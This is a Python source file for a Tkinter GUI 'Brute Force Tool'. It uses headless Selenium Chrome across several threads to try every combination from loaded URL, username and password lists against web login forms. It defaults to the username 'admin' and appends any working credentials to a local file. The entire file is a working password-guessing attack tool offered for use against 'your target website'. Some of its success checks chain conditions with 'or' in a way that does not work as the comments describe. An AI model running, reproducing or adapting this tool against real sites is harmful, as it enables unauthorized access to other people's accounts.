import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import time
import os

class BruteForceApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Brute Force Tool")
        self.root.geometry("600x750") # Increased window size to accommodate new elements

        # --- Initialize flags and paths first ---
        self.url_file_path = None
        self.username_file_path = None
        self.password_file_path = None
        self.driver_path = None
        self.success_found = False # Flag to stop on first success
        self.successful_attempts_count = 0
        self.farts_file_lock = threading.Lock() # Lock for thread-safe file writing

        # --- Tkinter Widgets Initialization (Order matters for dependencies) ---

        # Status output
        self.status_label = tk.Label(root, text="Status: Ready", wraplength=580, justify=tk.LEFT)
        self.status_label.pack(pady=5)

        # Debug mode checkbox
        self.debug_var = tk.IntVar()
        self.debug_checkbox = tk.Checkbutton(root, text="Enable Debug Logging", variable=self.debug_var)
        self.debug_checkbox.pack(pady=5)

        # --- WebDriver Setup (Can now use status_label and debug_var) ---
        self.install_driver_once()

        # URL list section
        tk.Label(root, text="1. Load URL List:").pack(pady=(10,0))
        self.load_url_btn = tk.Button(root, text="Browse URL File", command=self.load_url_file)
        self.load_url_btn.pack(pady=2)
        self.url_file_path_label = tk.Label(root, text="No URL file loaded")
        self.url_file_path_label.pack(pady=2)

        # Username Field ID
        tk.Label(root, text="2. Username Field ID (e.g., mat-input-2):").pack(pady=(10,0))
        self.username_entry = tk.Entry(root, width=70)
        self.username_entry.insert(0, "mat-input-2")
        self.username_entry.pack(pady=2)

        # Password Field ID
        tk.Label(root, text="3. Password Field ID (e.g., mat-input-1):").pack(pady=(10,0))
        self.password_entry = tk.Entry(root, width=70)
        self.password_entry.insert(0, "mat-input-1")
        self.password_entry.pack(pady=2)

        # Login Button ID (Optional)
        tk.Label(root, text="4. Login Button ID (Optional, if different from Password field submit):").pack(pady=(10,0))
        self.login_button_entry = tk.Entry(root, width=70)
        self.login_button_entry.pack(pady=2)

        # Username list section
        tk.Label(root, text="5. Load Username List (optional, defaults to 'admin'):").pack(pady=(10,0))
        self.load_username_btn = tk.Button(root, text="Browse Username File", command=self.load_username_file)
        self.load_username_btn.pack(pady=2)
        self.username_file_path_label = tk.Label(root, text="No Username file loaded")
        self.username_file_path_label.pack(pady=2)

        # Password list section
        tk.Label(root, text="6. Load Password List:").pack(pady=(10,0))
        self.load_pass_btn = tk.Button(root, text="Browse Password File", command=self.load_password_file)
        self.load_pass_btn.pack(pady=2)
        self.password_file_path_label = tk.Label(root, text="No Password file loaded")
        self.password_file_path_label.pack(pady=2)
        
        # Start Attack button
        self.start_btn = tk.Button(root, text="Start Attack", command=self.start_attack_thread)
        self.start_btn.pack(pady=10)

        # Successful Attempts Display
        self.success_count_label = tk.Label(root, text="Successful Logins: 0", font=("Arial", 10, "bold"))
        self.success_count_label.pack(pady=(10, 5))

        self.success_log_text = scrolledtext.ScrolledText(root, width=70, height=10, state='disabled')
        self.success_log_text.pack(pady=5)
        # Configure tag for green text
        self.success_log_text.tag_configure("green", foreground="green")


    def install_driver_once(self):
        """Installs the Chrome WebDriver once."""
        if self.driver_path: # Prevent re-installation if already done
            return

        self.update_status("Installing Chrome WebDriver (this may take a moment)...")
        try:
            self.root.update_idletasks() # Force UI update
            self.driver_path = ChromeDriverManager().install()
            self.update_status("WebDriver installed successfully.")
            self.log(f"WebDriver installed at: {self.driver_path}")
        except Exception as e:
            error_message = (
                f"Failed to install Chrome WebDriver: {e}\n"
                "Please ensure you have Google Chrome installed and an active internet connection.\n"
                "You might also need to run this script with administrator/root privileges if installation fails."
            )
            self.update_status(f"WebDriver Installation Failed: {e}")
            messagebox.showerror("WebDriver Error", error_message)
            self.start_btn.config(state=tk.DISABLED) # Disable attack button if no driver

    def log(self, message):
        """Prints messages to console if debug logging is enabled."""
        if self.debug_var.get():
            print(message)

    def update_status(self, message):
        """Updates the status label on the GUI."""
        self.status_label.config(text=f"Status: {message}")
        self.root.update_idletasks() # Force UI update for immediate feedback

    def load_url_file(self):
        self.url_file_path = filedialog.askopenfilename(title="Select URL File", filetypes=(("Text Files", "*.txt"),))
        if self.url_file_path:
            self.url_file_path_label.config(text=f"Loaded: {os.path.basename(self.url_file_path)}")
            self.log(f"Loaded URLs from {self.url_file_path}")
            self.update_status(f"URL list loaded: {os.path.basename(self.url_file_path)}")

    def load_password_file(self):
        self.password_file_path = filedialog.askopenfilename(title="Select Password File", filetypes=(("Text Files", "*.txt"),))
        if self.password_file_path:
            self.password_file_path_label.config(text=f"Loaded: {os.path.basename(self.password_file_path)}")
            self.log(f"Loaded passwords from {self.password_file_path}")
            self.update_status(f"Password list loaded: {os.path.basename(self.password_file_path)}")

    def load_username_file(self):
        self.username_file_path = filedialog.askopenfilename(title="Select Username File", filetypes=(("Text Files", "*.txt"),))
        if self.username_file_path:
            self.username_file_path_label.config(text=f"Loaded: {os.path.basename(self.username_file_path)}")
            self.log(f"Loaded usernames from {self.username_file_path}")
            self.update_status(f"Username list loaded: {os.path.basename(self.username_file_path)}")

    def start_attack_thread(self):
        """Starts the attack in a separate thread to keep the UI responsive."""
        username_field_id = self.username_entry.get().strip()
        password_field_id = self.password_entry.get().strip()
        login_button_id = self.login_button_entry.get().strip()

        if not self.driver_path:
            messagebox.showerror("Error", "WebDriver not installed. Cannot start attack.")
            return

        if not username_field_id or not password_field_id or not self.url_file_path or not self.password_file_path:
            messagebox.showwarning("Input Error", "Please ensure Username Field ID, Password Field ID are filled, and URL/Password files are selected.")
            return
        
        self.start_btn.config(state=tk.DISABLED) # Disable button during attack
        self.successful_attempts_count = 0 # Reset counter
        self.success_count_label.config(text="Successful Logins: 0")
        self.success_log_text.config(state='normal')
        self.success_log_text.delete(1.0, tk.END) # Clear previous results
        self.success_log_text.config(state='disabled')
        
        self.update_status("Attack started...")
        self.success_found = False # Reset flag for new attack

        # Start the _run_attack in a new thread
        attack_thread = threading.Thread(target=self._run_attack, args=(username_field_id, password_field_id, login_button_id))
        attack_thread.start()

    def _run_attack(self, username_field_id, password_field_id, login_button_id):
        """Core logic for the brute-force attack, run in a separate thread."""
        try:
            with open(self.url_file_path, 'r') as url_file:
                urls = [line.strip() for line in url_file if line.strip()]

            with open(self.password_file_path, 'r') as pass_file:
                passwords = [line.strip() for line in pass_file if line.strip()]

            usernames = []
            if self.username_file_path:
                with open(self.username_file_path, 'r') as user_file:
                    usernames = [line.strip() for line in user_file if line.strip()]
            if not usernames:
                usernames = ['admin'] # Default to 'admin' if no username file or empty

            self.log(f"Loaded URLs: {urls}")
            self.log(f"Loaded Usernames: {usernames}")
            self.log(f"Loaded Passwords: {passwords}")

            max_threads = 5
            sem = threading.Semaphore(max_threads)
            threads = []
            
            total_attempts = len(urls) * len(usernames) * len(passwords)
            attempt_count = 0

            for url in urls:
                if self.success_found:
                    break # Stop if success found globally
                for username in usernames:
                    if self.success_found:
                        break # Stop if success found globally
                    for password in passwords:
                        if self.success_found:
                            break # Stop if success found globally

                        attempt_count += 1
                        # Update status on the main thread
                        self.root.after(0, self.update_status, f"Attempting {attempt_count}/{total_attempts}: {url} | User: {username} | Pass: {password}")
                        
                        thread = threading.Thread(target=self.wrapped_attempt, 
                                                args=(sem, url, username_field_id, password_field_id, login_button_id, username, password))
                        threads.append(thread)
                        thread.start()

            # Wait for all current threads to complete
            for thread in threads:
                thread.join()

            if not self.success_found:
                self.root.after(0, self.update_status, "Attack finished. No successful login found.")
                self.root.after(0, messagebox.showinfo, "Attack Finished", "No successful login found.")
            else:
                self.root.after(0, self.update_status, f"Attack finished. Found {self.successful_attempts_count} successful logins.")
            
        except Exception as e:
            self.root.after(0, self.update_status, f"Attack failed: {e}")
            self.log(f"Attack failed: {e}")
        finally:
            self.root.after(0, self.start_btn.config, state=tk.NORMAL) # Re-enable button on main thread

    def wrapped_attempt(self, sem, url, username_field_id, password_field_id, login_button_id, username, password):
        """Wrapper for attempt_login to manage semaphore and stop flag."""
        with sem:
            if self.success_found: # Double-check the flag after acquiring semaphore
                self.log(f"Skipping {username}:{password} for {url} as success already found.")
                return

            self.log(f"Attempting login on {url} with user: {username}, pass: {password}")
            try:
                if self.attempt_login(url, username_field_id, password_field_id, login_button_id, username, password):
                    self.success_found = True # Set the flag to true globally on first success
                    # Increment counter and update GUI from main thread
                    self.root.after(0, self.increment_success_count)
                    # Log to text area and save to file from main thread
                    self.root.after(0, self.log_successful_attempt, url, username, password)
                    self.root.after(0, self.save_successful_attempt, url, username, password)
                    # We might want to stop all other attempts after first success
                    # messagebox.showinfo will block, so it's best to call it after the main attack thread ends
                    # if you want to allow other threads to finish their current checks.
                    return # Indicate success and stop this specific attempt
            except Exception as e:
                self.log(f"Error during attempt on {url} with {username}:{password}: {e}")

    def increment_success_count(self):
        """Increments the success counter and updates the GUI label."""
        self.successful_attempts_count += 1
        self.success_count_label.config(text=f"Successful Logins: {self.successful_attempts_count}")

    def log_successful_attempt(self, url, username, password):
        """Logs a successful attempt to the scrolled text widget."""
        self.success_log_text.config(state='normal')
        self.success_log_text.insert(tk.END, f"SUCCESS: URL: {url}, User: {username}, Pass: {password}\n", "green")
        self.success_log_text.see(tk.END) # Auto-scroll to the end
        self.success_log_text.config(state='disabled')

    def save_successful_attempt(self, url, username, password):
        """Saves a successful attempt to the 'farts.txt' file."""
        with self.farts_file_lock: # Use a lock for thread-safe file writing
            try:
                with open("farts.txt", "a") as f: # "a" for append mode
                    f.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                self.log(f"Saved successful attempt to farts.txt: {url}, {username}, {password}")
            except Exception as e:
                self.log(f"Error saving successful attempt to farts.txt: {e}")


    def attempt_login(self, url, username_field_id, password_field_id, login_button_id, username, password):
        """
        Attempts a login for a given URL, username, and password.
        Returns True on perceived success, False otherwise.
        """
        driver = None
        try:
            options = webdriver.ChromeOptions()
            options.add_argument('--headless') # Run Chrome in headless mode (no GUI)
            options.add_argument('--log-level=3') # Suppress verbose logging from Chrome itself

            service = webdriver.ChromeService(executable_path=self.driver_path)
            driver = webdriver.Chrome(service=service, options=options)
            
            self.log(f"Navigating to {url}")
            driver.get(url)

            # Use explicit waits for elements
            username_field = WebDriverWait(driver, 15).until(
                EC.presence_of_element_located((By.ID, username_field_id))
            )
            username_field.send_keys(username)
            self.log(f"Entered username: {username}")

            password_field = WebDriverWait(driver, 15).until(
                EC.presence_of_element_located((By.ID, password_field_id))
            )
            password_field.send_keys(password)
            self.log(f"Entered password: {password}")

            if login_button_id:
                login_button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.ID, login_button_id))
                )
                login_button.click()
                self.log("Clicked login button.")
            else:
                password_field.send_keys(Keys.RETURN)
                self.log("Pressed RETURN on password field.")

            # --- Success/Failure Detection (Crucial: YOU MUST CUSTOMIZE THIS) ---
            # This is the most critical part to adapt to your target website.
            # Inspect the website after a successful login and a failed login to determine reliable indicators.

            # Attempt 1: Check for redirection to a "logged-in" URL or presence of a success-specific element
            try:
                # Example 1A: Check if URL changes away from the login page OR to a known success URL
                # Adjust 'login_url_path_fragment' to be a unique part of your login page's URL path
                # For example, if your login page is 'https://example.com/login.html', use 'login.html'
                login_url_path_fragment = url.split('/')[-1].split('?')[0].split('#')[0] # Get base filename/path fragment
                
                # Wait for URL to NOT contain the login fragment (indicating navigation away),
                # OR to contain a known success path/fragment.
                # Example: EC.url_contains("/dashboard") or EC.url_contains("/home")
                WebDriverWait(driver, 10).until(
                    EC.url_changes(url) or EC.url_contains("/dashboard") or EC.url_contains("/home") or
                    EC.presence_of_element_located((By.ID, "user-profile-widget")) or # e.g., a dashboard element
                    EC.presence_of_element_located((By.CLASS_NAME, "logged-in-user-menu")) # e.g., a user menu that appears post-login
                )

                # After initial check, perform a more robust check for a definitive success indicator
                # This could be a unique element ID/class that only appears on the dashboard/logged-in page
                # YOU MUST FIND A UNIQUE ELEMENT THAT APPEARS ONLY ON SUCCESS
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "body.logged-in")) or # Example: check for a specific body class
                    EC.presence_of_element_located((By.ID, "main-dashboard-content")) or # Example: a main dashboard div
                    EC.presence_of_element_located((By.LINK_TEXT, "Logout")) # Example: a logout link
                )
                self.log(f"Login successful for {username}:{password} on {url} (based on URL/element change).")
                return True
            except Exception as e:
                self.log(f"No clear success indicator found via URL/element change for {username}:{password}: {e}")
                # Continue to check for error messages if URL didn't change or element not found

            # Attempt 2: Check for specific error messages on the page
            error_messages = [
                "invalid credentials", "incorrect username or password",
                "login failed", "authentication failed", "access denied",
                "invalid username or password", "username or password incorrect"
            ]
            page_source_lower = driver.page_source.lower()

            for error_msg in error_messages:
                if error_msg in page_source_lower:
                    self.log(f"Login failed for {username}:{password} on {url} (error message: '{error_msg}' found).")
                    return False

            # Fallback: If still on the "original" login page after submission, assume failure
            # This handles cases where there's no clear redirection or error message.
            current_url_base = driver.current_url.split('?')[0].split('#')[0]
            if current_url_base == url.split('?')[0].split('#')[0]:
                 self.log(f"Login failed for {username}:{password} on {url} (remained on login page).")
                 return False

            # If none of the above conditions are met, it's ambiguous. Assume failure for safety.
            self.log(f"Login attempt inconclusive for {username}:{password} on {url}. Assuming failure.")
            return False

        except Exception as e:
            self.log(f"An error occurred during Selenium operation for {username}:{password} on {url}: {e}")
            return False # Assume failure on WebDriver errors
        finally:
            if driver:
                try:
                    driver.quit() # Close the browser instance
                except Exception as ex:
                    self.log(f"Error shutting down WebDriver: {ex}")

# --- Main application execution ---
if __name__ == "__main__":
    root = tk.Tk()
    app = BruteForceApp(root)
    root.mainloop()